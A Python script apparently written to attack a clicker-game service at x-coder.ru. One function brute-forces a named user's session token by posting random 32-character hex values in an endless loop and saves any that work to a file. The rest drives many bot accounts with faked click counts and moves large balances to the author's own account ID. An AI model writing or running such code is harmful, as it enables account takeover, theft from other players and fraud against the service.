from my_API import *

begClck = 0
endClck  = 0
delay = 60/len(mainData)
#if delay<10:
#        delay = 12
sendAfterBalance = 500000
#sendAfterBalance = 10000

def randAth():
        alph = '1234567890abcdef'
        ath = ''
        for i in range(32):
                ath = ath + alph[random.randint(0,15)]
        return ath

hackID = '281154043' #chance 1 by 340282366920938463463374607431768211456

#hackID = '473510976' #test my ID

def writeToFile(h):
        f = open('ALT_SOME.txt','a')
        f.write(h+'\n')
        f.close()

def hack(hID):
        global mainData
        pData = {'s_auth':'','s_vk_id':hID}
        pData['v'] = '1.0.0'
        pData['clicks'] = '0'
        print('try to hack - '+hID)
        while True:
                s_auth = randAth()
                #s_auth = '5cba4951a8fc8c4369002312f394b95f' #test func
                pData['s_auth'] = s_auth
                #print(pData)
                try:
                        r = s.post('https://x-coder.ru/ping',pData,headers=hd)
                        #print(r.text)
                        if ('{' in r.text):
                                print('Auth founded '+s_auth)
                                writeToFile(s_auth)
                except:
                        False
                time.sleep(0.03)
                #print(

hd['User-Agent'] = 'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36'

hack(hackID)

step = 0
#Buy(mainData[6],1)
idDontSend = []
print('--------------------------------------------')
print('Start Mining')
accounts = len(mainData)
stepAcc = accounts-1
while True:
        t = ''
        allCoins = 0
        for i in range(accounts):
                pData = mainData[i]
                pData['v'] = '1.0.0'
                pData['clicks'] = str(random.randint(begClck,endClck))                
                try:
                        r = s.post('https://x-coder.ru/ping',pData,headers=hd)
                        info = r.text                        
                        print(i,'/',stepAcc,' - ',info)                        
                        #t = t+info+'\n'

                        try:
                                info = info.split(',')
                                if info[0].split(':')[1]=='"ok"':
                                        balance = int(float(info[1].split(':')[1]))
                                        allCoins+=balance
                                        if balance>=sendAfterBalance and i>0:
                                             #time.sleep(10)
                                             doTranc(mainData[i],'473510976',balance)
                        except:
                                False
                except:
                        print('errPost'+str(i))
                time.sleep(delay)
        #print(money)
        if(step%1==0):
                print(t)
                print('. all: ',allCoins)
                print()
                print()
                print()
        time.sleep(1)
        step+=1
        step-=1

#print(r.text)    

#print(r.text)
